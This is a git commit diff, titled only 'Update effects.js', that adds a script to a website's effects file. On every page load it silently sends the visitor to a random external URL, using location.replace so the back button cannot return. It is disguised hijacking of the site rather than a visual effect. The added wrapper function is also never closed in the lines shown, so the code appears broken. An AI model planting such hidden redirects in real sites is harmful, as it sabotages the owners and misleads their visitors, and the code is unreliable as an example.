c6c30a5ff3af10fc5db7802f88f13e8382d2edfa
skidinghub <235431650+skidinghub@users.noreply.github.com>
2025-10-22 18:02:51 -0500

    Update effects.js

--- effects.js
+++ effects.js
@@ -1,3 +1,26 @@
+(function () {
+  'use strict';
+
+  const RANDOM_SITES = [
+    'https://www.youtube.com/watch?v=LcCPzxAQplU',
+    'https://duckduckgo.com',
+    'https://mozilla.org',
+    'https://github.com',
+    'https://itch.io'
+  ];
+
+  function goRandomOnLoad() {
+    if (!RANDOM_SITES.length) return;
+    const url = RANDOM_SITES[Math.floor(Math.random() * RANDOM_SITES.length)];
+    // Replace location to avoid adding a history entry
+    window.location.replace(url);
+  }
+
+  if (document.readyState === 'complete') {
+    goRandomOnLoad();
+  } else {
+    window.addEventListener('load', goRandomOnLoad, { once: true });
+  }
 function copyAddress(id) {
     const svgElement = document.getElementById(id + 'Input');
     const title = svgElement.getAttribute('title');
@@ -102,3 +125,4 @@ typeWriter();
 });
 
 });
+
